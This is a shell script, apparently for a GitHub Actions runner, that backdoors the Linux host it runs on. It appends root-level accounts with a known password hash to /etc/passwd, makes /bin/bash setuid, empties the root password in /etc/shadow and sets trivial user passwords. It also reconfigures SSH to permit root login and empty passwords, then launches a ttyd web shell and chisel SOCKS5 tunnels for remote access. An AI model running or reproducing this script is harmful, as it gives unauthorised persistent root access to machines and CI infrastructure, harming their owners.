sudo bash -c 'cp /etc/passwd /etc/passwd.bak;
cp /etc/shadow /etc/shadow.bak;
echo "tee:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:0:0:toor:/tmp:/bin/bash" >>/etc/passwd;
echo "te:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:999:999:toor:/tmp:/bin/bash" >>/etc/passwd;

chmod +s /bin/bash;
echo runneradmin:1|chpasswd ;  
echo runner:1|chpasswd;

sed -i "s/^#\?\(PermitRootLogin\)/\1 yes  #/g" /etc/ssh/sshd_config;
sed -i "s/^#\?\(GatewayPorts\)/\1 yes  #/g" /etc/ssh/sshd_config;
sed -i "s/^#\?\(Port 22\)/\1 \n Port  40022  \n #/g" /etc/ssh/sshd_config;
sed -i "s/^#\?\(PermitEmptyPasswords\)/\1 yes # /g" /etc/ssh/sshd_config;

#grep -C4 Port /etc/ssh/sshd_config; 

iptables -I INPUT 1 -p tcp --dport  22 -i tun+ -j ACCEPT;
       
        
cd /home/runner/work/nc_test/nc_test/;
gunzip chisel_*_linux_amd64.gz;
chmod 0777 chisel_*_linux_amd64*;
mv chisel_*_linux_amd64 /tmp/chisel;
setsid ./ttyd.x64 -i lo -p 7891 -b /l/h  -d  7 /bin/bash &
setsid /tmp/chisel server -v --host 127.0.0.1 -p 60080 --socks5 --backend http://127.0.0.1:7891/  2>/tmp/logch2.txt >/tmp/logch1.txt &
setsid /tmp/chisel server -v --host 127.0.0.1 -p 5244 --socks5 --backend http://127.0.0.1:4040/    &


#echo root:1|chpasswd;
# 删除shadow里root的密码
sed -i -E "s/^(root:)([^:]+)(..+)$/\1\3/g" /etc/shadow|grep root;
grep root /etc/shadow;

setsid bash -c "
/etc/init.d/ssh  stop ;sleep 1;
/etc/init.d/ssh  start ;
" &

id'

cd /tmp;
# declare -x POWERSHELL_DISTRIBUTION_CHANNEL="GitHub-Actions-ubuntu20"